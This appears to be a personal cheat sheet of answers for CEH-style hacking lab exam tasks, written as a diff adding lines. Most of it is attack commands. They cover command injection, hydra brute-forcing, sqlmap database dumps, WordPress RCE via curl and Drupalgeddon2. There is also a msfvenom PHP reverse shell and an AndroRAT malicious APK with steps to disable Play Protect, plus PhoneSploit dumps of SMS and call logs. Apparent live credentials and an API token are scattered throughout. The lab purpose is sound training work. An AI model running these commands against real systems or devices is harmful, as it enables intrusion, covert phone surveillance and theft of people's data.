+Suspects of a possible Session hijacking attack on a machine. Find out the protocol used to sniffing the network:
+
+Use filter ARP
+-------------------------------------------------------------------------------------------------------------------
+To perform web crawling on the web application example.com and identify the no of live png files in image folder:
+
+curl http://example.com/ | grep .png | wc -l
+curl -vv http://example.com/ | grep .png | wc -l
+
+-------------------------------------------------------------------------------------------------------------------
+Perform command injection on 10.10.10.25 and find out how many user accounts are registered with the machine: 8
+
+Step 1: open browser and search 10.10.10.25:8080
+
+Step 2: select command injection
+
+Step 3: Enter "127.0.0.1 && net user" (in ping a device)
+
+-------------------------------------------------------------------------------------------------------------------
+A file named hash.txt has been upload through DVWA http://10.10.10.25:8080/DVWA Note: Username- admin; Password- password 
+Path= C:\wamp64\www\DVWA\hackable\uploads\Hash.txt (Hint Use type command to view the file):
+Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash
+
+{% embed url="https://hashes.com/en/decrypt/hash" %}Cr@ck3d
+https://crackstation.net
+
+-------------------------------------------------------------------------------------------------------------------
+You are assigned a task to perform security audit on the:
+mobile application and find out whether the application using permission to Read-call-logs:
+
+https://sisik.eu/apk-tool (to analyse APK file - drag and drop)
+
+-------------------------------------------------------------------------------------------------------------------
+AES-Tool to decrypt file.aes:
+
+https://www.devglan.com/online-tools/aes-encryption-decryption
+
+-------------------------------------------------------------------------------------------------------------------
+shodan.io: identify whether the message belongs to SCADA/ICS/IoT systems in US:
+
+> IoT
+
+melo92i = phenry@commmmm.com
+4#WKiQkXdx%9E3k
+
+-------------------------------------------------------------------------------------------------------------------
+There is an Android device in the subnet. Identify the device. Get the files in scan folder:
+
+nmap -p 5555 192.168.10.0/24
+Connect the Android device via USB and run the following (adb tcpip 5555) or if not possible adb via PhoneSploit
+adb connect 192.168.1.15:5555
+adb shell
+ls
+cd sdcard
+ls
+cd Download
+exit
+adb pull /sdcard/Download /home/attacker (will download all files in Download and will copy folder to /home/attacker/Download
+*copy it via smb://172.25.0.11 by browsing first so it's mounted & decode it via BcTextEncoder on windows
+(ryptD3(0d3
+Otherwise:
+cat encode.txt (copy even strange character ?? and save it to share drive & decode it via BcTextEncoder on windows
+BcTextEncoder - in bottom - Encoded text - copy content above - click Decode - Enter password - Decode plain text = ok
+
+adb pull /sdcard/scan /home/to/local/directory
+apt install ent (or copy it to parrot and use cyberchef)
+ent evil.elf
+sha384sum evil.elf
+
+find file in adb:
+adb shell ls -lR | grep secret.txt 
+adb shell ls -lR | find "secret"
+--------------------------------------------------------------------------------------------------------------------------
+
+Perform the vulnerability scan for the given IP address 192.168.39.99:
+nmap -sV 192.168.39.99 -oN nmapsV.txt
+nmap --script=vuln 192.168.39.99 -oN nmapScript.txt
+
+OpenVas & Nessus & OWASP
+--------------------------------------------------------------------------------------------------------------------------
+
+What is the severe value of a vulnerability that indicates the end of life for a web development language platform:
+PHP, Ruby on Rails, or Node.js, if the version being used is no longer supported, the lack of ongoing security updates creates a high-risk situation.
+version:
+
+Exploit a remote login application on a Linux target in the given subnet to access a sensitive file:
+
+nmap -sV -p 22 192.168.X.X --open  # Replace with the target IP address
+hydra -l martin -P /path/to/rockyou.txt ssh://192.168.X.X
+ssh martin@192.168.X.X
+cd Desktop
+type secret.txt  (like cat but on windows = type)
+
+hydra -l username -P /path/to/wordlist telnet://192.168.X.X
+
+exploit via metasploit:
+msfconsole
+use exploit/linux/ssh/your_exploit_here
+set RHOST 192.168.X.X
+set RPORT 22
+exploit
+
+or
+
+scp username@192.168.X.X:/path/to/sensitive_file /local/destination
+cat /path/to/sensitive_file
+
+find / -type f -perm -4000 2>/dev/null
+-----------------------------------------------------------------------------------------------------------
+
+-Perform a vulnerability scan for the host with IP address 172.20.0.16:
+What is the severity score of a vulnerability the indicates the End of Life of a web development language platform?
+
+-----------------------------------------------------------------------------------------------------------
+-Determine the UDP based application layer protocol the attacker use to flood the server via Wireshark:
+(check target destination port = 80)
+Application Layer Flood Attack
+denial-of-service (DoS) attack
+
+-identify the severity level/potential impact of the attack performed in Wireshark: 
+(perform deep down Expert Info analysis). (Format: Aaaaaaa) = Warning
+1. Open Expert Information via Wireshark
+
+Go to Analyze → Expert Information.
+This opens a window with all “Expert Info” items categorized.
+
+2. Understand the Severity Levels
+
+Wireshark assigns each event a level:
+
+Error (red) → Likely indicates broken communication (e.g., malformed packets, protocol violations).
+
+Warning (orange) → Something unusual but not fatal (e.g., retransmissions, bad checksums).
+
+Note (yellow) → Informational hints (e.g., protocol preferences, potential misconfigurations).
+
+Chat (blue) → General diagnostic info, often harmless.
+-----------------------------------------------------------------------------------------------------------
+Exploit weak credentials of FTP on Linux via brute-force attack on subnet 192.168.10.0/24. Obtain the hidden file: 
+
+Exploit weak credentials used for FTP service on a Windows machine in the 192.168.0.0/24 subnet. 
+Obtain the file, Credentials.txt, hosted on the FTP root, and Enter its content as the answer.
+
+nmap -p 21 -sV 192.168.10.0/24 --open
+
+hydra -l nick -P /path/to/rockyou.txt ftp://192.168.10.111
+ftp
+open 192.168.10.111
+nick
+apple
+dir
+cd Desktop
+dir
+get w_domain.txt -
+("id": "7867721010")
+get 52012.py -
+(vendore Homepage = https://www.crushftp.com/)
+
+-----------------------------------------------------------------------------------------------------------
+Escalate privilege on a Linux machine. User-level credentials are given.10. Find a file entry point. File is given1:
+
+How to Find a File Entry Point
+1-For PE (Windows Executables)
+Tool: PEiD, CFF Explorer, PEview, or objdump
+
+Steps: Open the .exe or .dll file in the tool.
+
+Look for: AddressOfEntryPoint in the Optional Header
+ImageBase (base load address)
+Entry point address in memory = ImageBase + AddressOfEntryPoint
+
+Example in PEview:
+
+yaml
+Copy
+Edit
+Optional Header:
+  AddressOfEntryPoint: 0x0000B4A0
+  ImageBase: 0x00400000
+Entry Point (RVA) = 0x0040B4A0
+
+2-For ELF (Linux Executables)
+Tool: readelf, objdump, or rabin2 (from Radare2)
+
+Command:
+
+bash
+Copy
+Edit
+readelf -h file.elf | grep "Entry point address"
+Output example:
+
+arduino
+Copy
+Edit
+Entry point address: 0x8048320
+This tells you where execution starts when the binary is loaded.
+
+3-Using a Disassembler / Debugger
+If you need to actually inspect the instructions at the entry point:
+IDA Pro, Ghidra, or Radare2: Automatically parse the binary and take you to the entry point.
+x64dbg / OllyDbg: Load the executable → Execution stops at entry point → You can see first instructions.
+
+-----------------------------------------------------------------------------------------------------------
+You are provided a username/password for a website. Use SQL Injection attack to extract the password of another user:
+Perform the SQL injection attack on your target web application cinema.cehorg.com and extract the password of a user Sarah. 
+You have already registered on the website with credentials Karen/computer.
+
+wpscan ...
+
+-----------------------------------------------------------------------------------------------------------
+Analyze IoT traffic. Identify the packet with the publish message and enter the length or % humidity:
+
+Filter for MQTT: Type mqtt in the filter bar.
+Find Publish Messages: Look for Publish Message - Info of the packet
+*Double click on packet with info High_humidity and it will show % of the alert: 50
+Check the Length: In the Frame section of the packet details, check the length of the packet.
+
+-----------------------------------------------------------------------------------------------------------
+Crack the weak credentials of wifi from a pcap file:
+filter packets using the Wireshark filter = eapol
+aircrack-ng yourfile.pcap
+
+*Convert the Handshake to a Readable Format
+aircrack-ng -w /path/to/wordlist.txt yourfile-01.cap
+
+hashcat -m 2500 -a 0 -w 3 yourfile.hccapx /path/to/wordlist.txt
+Here, -m 2500 specifies WPA2, -a 0 specifies dictionary attack, and -w 3 sets the workload for Hashcat. 
+The .hccapx file is the handshake file converted into Hashcat's format.
+
+https://github.com/cmuppin/CEH/blob/main/Cryptography
+-----------------------------------------------------------------------------------------------------------
+Crack / find the credentials on http from a pcapng file Wireshark:
+
+http.request.method == POST
+
+*Look FOR THE FIRST HTTP POST then other if not accepted
+apply as filter - select http (protocol)
+_ws.col.protocol == "HTTP"
+then apply as filter - http.request.method == POST
+Post /login.aspx
+lee/test
+
+POST / HTTP/1.1
+kety/apple
+
+-----------------------------------------------------------------------------------------------------------
+Determine the ip of the victim in 172.30.10.0/24 via wireshark file:
+
+Statistics IPv4 Statistics - All Addresses
+look for Count higher packets is the one
+172.30.10.200
+*Make sure it's the destination / victim ip not the source / attacker
+
+-----------------------------------------------------------------------------------------------------------
+Determine the ip of the hacker using RPC service via wireshark file:
+
+via Wireshark - Statistics - Conversations - TCP Tab will show port 135 and attacker ip
+or
+tcp.dstport == 135
+Check source ip = attacker
+
+-----------------------------------------------------------------------------------------------------------
+Determine the ip of the hacker using UDP service via wireshark file:
+
+ip.proto == 17 or type in filter = udp
+Check source ip (will be the attacker)
+-----------------------------------------------------------------------------------------------------------
+
+Determine the UDP based application layer protocol which attacker employed to flood the machine: 
+Wireshark - Statistics - Conversations - UDP Tab
+Wireshark - Statistics - IPV4 Statistics - Source and IP Address
+Check destination port
+udp port 26000 flooding
+
+Quake Network Protocol (UDP Port 26000)
+other UDP based application layer protocol could be:
+VoIp (UDP 5060)
+NetBIOS (UDP 137,8,9)
+CharGen (UDP 19)
+SNMPv2 (UDP 161)
+QOTD (UDP 17)
+RPC (UDP 135)
+SSDP (UDP 1900)
+CLDAP (UDP 389)
+
+-----------------------------------------------------------------------------------------------------------
+Determine the attacker ip on report.txt (from Anti-Ddos Guardian) which has transmitted more numbers of packets to target:
+
+*check for the remote ip address as it is a report concatenated report export
+
+check for Incoming Bytes higher + many times for same ip = 192.168.10.222
+*check for UDP port high = 58777 + 54886
+*check for high incoming (Blocked) packets
+-----------------------------------------------------------------------------------------------------------
+
+A RAT server is installed on a server. Connect with it and access the file secret:
+nmap -p- 192.168.X.X   # Replace with the target IP address
+nmap -p 5555 192.168.X.X --open
+
+find / -name "secret"
+cp /path/to/secret /tmp/secret_copy
+dir /a:h (hidden files w2k)
+-----------------------------------------------------------------------------------------------------------
+Decrypt the veracrypt volume:
+
+Click on "Select File...": This allows you to browse for the encrypted VeraCrypt volume (the .hc or .veracrypt file)
+Mount the Volume
+Choose a drive letter to mount the volume to.
+Click "Mount": This will prompt you for the password (and keyfile, if applicable).
+Enter the Password and Keyfile
+Enter the password used to encrypt the volume.
+If a keyfile was used, click on "Keyfiles", browse to the location of the keyfile, and select it.
+Click OK: If the password and keyfile (if applicable) are correct, VeraCrypt will mount the volume and assign it to a drive letter.
+
+Access the Decrypted Volume
+Once the volume is successfully mounted, you can access it like any other drive or partition on your system. 
+Open File Explorer (Windows) or the file manager (Linux/macOS)
+
+Dismount the Volume
+When you're done, make sure to dismount the volume from VeraCrypt to securely unmount the encrypted container:
+
+In VeraCrypt, select the mounted volume and click "Dismount"
+
+*If You Don’t Have the Password or Keyfile:
+Unfortunately, if you do not have the correct password or keyfile, it is not possible to decrypt the VeraCrypt volume
+-----------------------------------------------------------------------------------------------------------
+
+hash comparaison, which file is the original which one's are the tampered one's:
+Generate Hashes for Each File
+
+sha256sum Tools.rar (d282) or upload to virus total to get hashes for multiple
+sha256sum filename2
+
+or on windows
+CertUtil -hashfile filename1 SHA256
+CertUtil -hashfile filename2 SHA256
+
+Compare the Hash Values
+
+For example:
+
+File 1 (Original): abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+File 2 (Tampered): abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567891
+The last character differs, indicating that File 2 has been modified.
+
+Identify the Original File:
+
+sha256sum file1 file2 file3 > checksums.txt
+
+Check for File Integrity
+
+OpenSSL (cross-platform): Can be used for various hash algorithms.
+HashCalc (Windows): A graphical tool to compute file hashes.
+FileVerifier++ (Windows): A tool that compares file hashes and can identify tampered files based on known hash values.
+-----------------------------------------------------------------------------------------------------------
+
+-Determine the last 4 digits SHA-256 hash value of the file Tools.rar :
+
+sha256sum Tools.rar
+-----------------------------------------------------------------------------------------------------------
+-Enumerate and hack a web app using wpscan and metasploit:
+
+wpscan --usernames james -P password.txt --url http://192.168.0.222:8080/CEH/
+wpscan --usernames james -P rockyou.txt --url http://192.168.0.222:8080/CEH/ 
+wpscan --usernames james -P rockyou.txt --url http://192.168.0.222:8080/CEH/ --plugins-detection aggressive --enumerate u
+wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u
+
+*scan found RCE for plugin: wp-upg
+curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'
+
+msfconsole
+
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE password.txt
+set RHOST 10.10.10.16
+set RPORT 8080
+set TARGETURI http://10.10.10.16:8080/CEH
+set USERNAME admin
+run
+-----------------------------------------------------------------------------------------------------------
+
+Exploit a RCE to compromise a target web server (DVWA Low security):
+
+| hostname
+| whoami
+| dir C:\
+| net user
+| net user user001 /Add
+| net user user001
+| net localgroup Administrators user001 /Add
+now you can use user001 to log in remote
+-----------------------------------------------------------------------------------------------------------
+
+SQL Injection Attack find the total numbers of users in the database:
+
+Login a website with a valid user or use OWASP ZAP and find Alerts SQL Injection (found Parameters txtpwd) + WASC ID
+user = admin or whatever
+password= ZAP' OR '1'='1' --
+(CWE ID = 89 + WASC ID = 19 are the results from OWASP ZAP)
+
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=1
+then f12 - Console - document.cookie
+"mscope=1jWydNf8wro=; ui-tabs-1=0"
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -T User_Login -dump
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -os-shell
+
+or try by id:
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=1
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=2
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=3
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=4
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=5
+*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=6 (nothing so 5 users)
+
+on DVWA:
+Go to SQL Injection and enter = ' or 1=1#
+or: if user & pass given
+F12 - Console - document.cookie
+sqlmap -u http://xxxx/sql/?idxxxxxx=Submit--cookie "security=low; PHPSESSIONID=121121212" --dbs
+or: use Burpsuite
+Intercept ON - browse DVWA http://xxxx/sql/?idxxx - see result GET 
+copy request on the bottom = right-click = copy to file  - save to sql.txt
+
+sqlmap -r sql.txt --dbs
+sqlmap Y upper case say yes N upper
+sqlmap -r sql.txt --dbs --batch (don't have to put Y or N)
+-----------------------------------------------------------------------------------------------------------
+
+Android ADB & phonesploit: will be installed in the root folder, if you don't find use the command like "find phonesploit".
+https://github.com/cmuppin/CEH/blob/main/Android or in /home/attacker/PhoneSploit-Pro
+adb connect 192.168.10.121:5555 or PhoneSploit-Pro adb shell integrated
+adb shell
+su -
+ls
+exit
+adb shell pm list packages -3 -f   (to list unoffcial apk installed)
+shell pm list packages -3 -f (from PhoneSploit-Pro adb shell integrated) 
+adb pull data/app/com.cxinventor.xxxxxxx==/base.apk .  (do download apk locally to analyze)
+crc32 base.apk
+53ac614c
+
+find . -type f -name "*.apk" -exec crc32 {} \;
+
+-Android call logs, find phising number PhoneSploit-Pro:
+adb shell
+x86_64:/$ su
+cd /sdcard/Calls
+cat call-logs.txt
+look for bank - ssn number asked
+
+*Below permissions denied....:
+x86_64:/$ cp /data/data/com.android.providers.contacts/databases/calllog.db /sdcard/
+exit
+adb pull /sdcard/calllog.db
+sqlite3 calllog.db "SELECT * FROM calls LIMIT 10;"
+
+cd ~/PhoneSploit-Pro
+python3 phonesploitpro
+1- connect a Device
+192.168.10.121
+15- Meterpreter
+dump_contacts
+dump_calllog
+dump_sms
+app_list
+sysinfo
+--------------------------------------------------------------------------------------------------------------------------------------
+
+-AndroRAT: create apk malicious for reverse shell:
+
+python3 androRAT.py --build -i 192.168.31.188 -p 8000 -o evil.apk
+copy apk to victim Android via your http hosted web server:
+mkdir /var/www/html/share
+chmod -755 /var/www/html/share
+chown -R 755 /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start / restart
+cp evil.apk /var/www/html/share
+adb install evil.apk
+*If adb install -g evil.apk failed click on PlayStore - Play Protect - Gears/settings - disable both Scan + Harmful:
+adb install -r myapp.apk  (-r reinstall keep data) or install via GUI
+
+python3 androRAT.py --shell -i 0.0.0.0 -p 8000 (listen and wait for client connection by installing evil.apk)
+*On Android victim browse http://192.168.31.247/share/evil.apk and install it, then attcker should have shell androRAT.
+
+*Install apk manually
+adb install -g evil.apk   (-g grant all runtime permissions automatically)
+adb install -r -g myapp.apk  (-r reinstall keep data)
+
+*If adb install -g evil.apk failed click on PlayStore - Play Protect - Gears/settings - disable both Scan + Harmful
+*not mandatory to login, click well to disable both Scan + Harmful
+Wmax25246@gmail.com
+TheSkyIsBlue2020$
+
+python3 androRAT.py --shell -i 0.0.0.0 -p 8000 (start listening on attacker):
+Interpreter:/> help
+
+    getSMS inbox 	
+    getCallLogs                --> returns call logs in a file
+    shell                      --> starts a sh shell of the device
+    getLocation                --> return the current location of the device
+    getIP                      --> returns the ip of the device
+    getSimDetails              --> returns the details of all sim of the device
+    clear                      --> clears the screen
+    getClipData                --> return the current saved text from the clipboard
+    getMACAddress              --> returns the mac address of the device
+
+lsof | more
+lsof | grep call
+lsof -p pid
+-----------------------------------------------------------------------------------------------------------
+
+-Identify the algorithm used for file encryption and hidden text cryt-128-06encr.hex containing ransom file password:
+Twofish/@!ph@|tE*t
+copy cryt-128-06encr.hex from PArrot to Windows and use cryp tool to Identify the algorithm used
+Twofish = 128 bites block size for the key
+-CT1 Algorithm ID Mapping (commonly used table) Based on CT1 documentation & export format:
+cryp tool when save will add  below:
+01 → DES (56-bit)
+02 → Triple-DES (3DES, 168-bit)
+03 → IDEA
+04 → Blowfish
+05 → RC4
+06 → Twofish     - cryt-128-06encr.hex
+07 → AES-128
+08 → AES-192
+09 → AES-256
+10 → RSA (public key)
+
+-If the key is not given, GUESS based on name of the algorithms 06 → Twofish and it's 128 bites block size for the key (32 characters)
+06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06
+
+-same if RC4 guess the key 05 05 05....
+
+----------------------------------------------------------------------------------------------------------------------------
+-TO Decrypt OPEN VeraCrypt click Volume - select file (im my docs) select drive M: and click MOUNT - AND PUT THE password given
+*VeraCrypt file is located in the instructions or my Documents File - open
+*If VeraCrypt file is on Linux / Parrot copy it via explorer smb:// then on Windows VeraCrypt click Volume - select file...
+
+---------------------------------------------------------------------------------------------------------------------------
+-You are assigned a task to attain KEYCODE-5 used in the employees mobile phone: 
+
+use option N in PhoneSploit for next page and go to KEYCODE / 34 if i remember and answer is Power Button
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+-you have obtained a screenshot of the attack using a background application: 
+Retrieve the screenshot of the attack using PhoneSploit (better to use adb shell or adb shell via phonesploit)
+determine the number of HTTP packets sent per second that shows in the image.png (zoom to make sure of the # = 23)
+adb pull /sdcard/Music/xxx.png
+Via explorer open it
+
+*option 6 on PhoneSploit-Pro downloaded a black screenshot so search via adb shell
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+-check the integrity of the files by comparing the MD5 hashes:
+Compare the hash values and determine the file name that has been tampered with
+md5sum Quotes.txt   (compare with original md5 hash file)
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+-He has requested a specific number of risk categories. The required HTML file is located on EH 1 otherwise wapiti www:
+
+apt-get install wapiti
+wapiti -u http://www.good.com
+$Firefox /root/.wapiti/generated_report/wwwxxxxxxx.html
+
+Check ho many categories on the right have one or more vulnerabilities = 3
+1 for Content Security Policy (to detect Cross-Site Scripting (XSS)
+1 for Clickjacking protection
+1 for MIME type confusion
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+-Decrypt file crypto forge (on windows - right click - decrypt):
+
+(on windows cryptoforge - right click on the file - decrypt - enter password or press enter if no password)
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+-Windows get file hash via powershell:
+
+Get-FileHash -Algorithm SHA256 .\secret.txt
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+-File transfer Parrot to Windows:
+
+smb://xxxxxx via explorer
+or:
+filetransfer.io
+or:
+python3 -m http.server 8000 (other pc http://x.x.x.x:8000 and you can download)
+or:
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share/
+chown -R www-data:www-data /var/www/html/share/
+cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
+service apache2 start  (then (other pc http://x.x.x.x/share)
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Drupal:
+msfconsole
+search durpal
+use unix/webapp/drupal_drupalgeddon2
+options
+show targets
+set taget 1 (try other if does not work 2 or 3...)
+run
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+File upload via DVWA to have a reverse shell:
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=444 -o shell.php
+in parralel before uploading:
+msfconsole -x "use exploit/multi/handler; set lhost 192.168.0.XX; set lport 444; set payload php/meterpreter/reverse_tcp; run"
+On DVWA file upload shell.php
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+IDOR vulnerability:
+Insecure direct object references
+https://insecure-website.com/customer_account?customer_number=132355
+https://insecure-website.com/static/12144.txt
+https://example.com/profile?user_id=124
+
+https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Version of pop3:
+nmap -p 110 192.168.x.x -sV 
+nmap --script vuln 192.168.0.x (lowest cve)
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+OpenStego for .bmp:
+
+already installed or search in CEH folder
+To Decrypt - click on Extract Data - input file.bmp and output Folder = C:\temp - put pwd otherwise leave - Extract Data
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+crack hashes:
+
+https://hashes.com - https://hashes.com/en/decrypt/hash - https://crackstation.net/
+john or hashcat if wordlist given otherwise above
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
+Malware detection and analysis sites:
+
+https://www.virustotal.com/
+
+http://totalhash.com/
+
+https://www.hybrid-analysis.com/
+
+http://www.herdprotect.com/knowledgebase.aspx
+
+http://www.phishtank.com/
+
+http://md5hashing.net/hash_type_checker
+
+https://threatcrowd.org
+
+https://www.trendmicro.com/en_us/research.html
+
+Web content verification sites:
+
+https://hackvertor.co.uk/public
+
+https://talosintelligence.com
+
+https://urlscan.io/domain/urlquery.net
+
+http://ipvoid.com/
+
+http://pgl.yoyo.org/urlex/
+
+http://www.internetofficer.com/seo-tool/redirect-check/
+
+Network utilities:
+
+https://www.whatismyip.com/ip-address-hostname-lookup/
+
+http://centralops.net/co/
+
+https://www.robtex.com/
+
+https://dnslytics.com/ip
+
+http://dnsviz.net/
+
+http://www.ipaddressguide.com/cidr
+
+Scripting utilities:
+
+http://snarkles.net/scripts/sneak/sneak.php
+
+http://utf-8.jp/public/jjencode.html
+
+http://ddecode.com/phpdecoder/
